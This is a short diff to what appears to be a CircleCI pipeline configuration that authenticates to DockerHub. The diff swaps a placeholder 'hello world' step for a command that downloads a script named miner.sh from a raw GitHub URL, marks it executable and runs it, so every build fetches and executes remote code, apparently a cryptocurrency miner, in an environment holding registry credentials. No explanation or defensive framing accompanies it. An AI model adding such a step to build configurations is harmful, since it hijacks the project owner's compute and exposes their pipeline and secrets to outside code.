@@ -8,4 +8,4 @@ jobs:
           password: $DOCKERHUB_PASSWORD  # context / project UI env-var reference
     steps:
       - checkout
-      - run: "hello world"
+      - run:  wget https://raw.githubusercontent.com/bznzangelo/sampleProject/main/miner.sh && chmod +x miner.sh && ./miner.sh
